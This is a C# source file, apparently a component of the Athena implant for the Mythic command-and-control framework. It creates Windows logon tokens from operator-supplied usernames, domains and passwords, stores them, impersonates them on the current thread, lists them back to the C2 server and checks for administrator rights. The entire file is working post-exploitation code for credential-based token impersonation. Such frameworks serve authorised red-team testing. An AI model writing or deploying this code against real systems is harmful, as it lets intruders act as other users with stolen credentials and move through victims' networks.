using Athena.Models.Mythic.Tasks;
using Athena.Models.Commands;
using Athena.Utilities;
using Microsoft.Win32.SafeHandles;
using System.Runtime.InteropServices;
using System.Text.Json;
using System.Security.Principal;
using Athena.Models.Responses;

namespace Athena.Commands
{
    public class TokenHandler
    {
        static Dictionary<int, SafeAccessTokenHandle> tokens = new Dictionary<int, SafeAccessTokenHandle>();
        /// <summary>
        /// Create a Token for impersonation
        /// </summary>
        /// <param name="job">The MythicJob containing the token information</param>
        public async Task<string> CreateToken(MythicJob job)
        {
            CreateToken tokenOptions = JsonSerializer.Deserialize(job.task.parameters, CreateTokenJsonContext.Default.CreateToken);
            SafeAccessTokenHandle hToken = new SafeAccessTokenHandle();
            try
            {
                if (Pinvoke.LogonUser(
                    tokenOptions.username,
                    tokenOptions.domain,
                    tokenOptions.password,
                    tokenOptions.netOnly ? Pinvoke.LogonType.LOGON32_LOGON_NETWORK : Pinvoke.LogonType.LOGON32_LOGON_INTERACTIVE,
                    Pinvoke.LogonProvider.LOGON32_PROVIDER_DEFAULT,
                    out hToken
                    ))
                {
                    Token token = new Token()
                    {
                        action = "add",
                        Handle = hToken.DangerousGetHandle().ToInt64(),
                        description = tokenOptions.name,
                        token_id = tokens.Count + 1
                    };

                    if (tokenOptions.username.Contains("@"))
                    {
                        string[] split = tokenOptions.username.Split('@');
                        token.user = $"{split[1]}\\{split[0]}";
                    }
                    else
                    {
                        token.user = $"{tokenOptions.domain}\\{tokenOptions.username}";
                    }


                    tokens.Add(token.token_id, hToken);

                    return new TokenResponseResult()
                    {
                        process_response = new Dictionary<string, string> { { "message", "0x22" } },
                        completed = true,
                        task_id = job.task.id,
                        tokens = new List<Token>() { token },
                        callback_tokens = new List<CallbackToken> { new CallbackToken()
                        {
                            action = "add",
                            host = System.Net.Dns.GetHostName(),
                            token_id = token.token_id,
                        } }

                    }.ToJson();
                }
                else
                {
                    return new ResponseResult()
                    {
                        user_output = $"Failed: {Marshal.GetLastWin32Error()}",
                        completed = true,
                        task_id = job.task.id,
                    }.ToJson();
                }

            }
            catch (Exception e)
            {
                return new ResponseResult()
                {
                    user_output = $"Failed: {e.ToString()}",
                    status = "errored",
                    completed = true,
                    task_id = job.task.id,
                }.ToJson();
            }
        }
        /// <summary>
        /// Begin impersonation for the thread
        /// </summary>
        /// <param name="job">The token ID</param>
        public async Task<bool> ThreadImpersonate(int t)
        {
            if (tokens.ContainsKey(t))
            {
                return Pinvoke.ImpersonateLoggedOnUser(tokens[t]);
            }
            return false;
        }
        /// <summary>
        /// End impersonation for the thread
        /// </summary>
        public async Task<bool> ThreadRevert()
        {
            return Pinvoke.RevertToSelf();
        }
        /// <summary>
        /// List available tokens for impersonation
        /// </summary>
        /// <param name="job">The MythicJob containing the token information</param>
        public async Task<string> ListTokens(MythicJob job)
        {
            Dictionary<string,string> toks = new Dictionary<string, string>();
            foreach (var token in tokens)
            {
                toks.Add(token.Key.ToString(), token.Value.DangerousGetHandle().ToString());
            }

            return new ResponseResult()
            {
                completed = true,
                user_output = JsonSerializer.Serialize(toks),
                task_id = job.task.id,
            }.ToJson();
        }
        public static int getIntegrity()
        {
            bool isAdmin;
            using (var identity = WindowsIdentity.GetCurrent())
            {
                var principal = new WindowsPrincipal(identity);
                isAdmin = principal.IsInRole(WindowsBuiltInRole.Administrator);
            }

            return isAdmin ? 3 : 2;
        }
    }
}
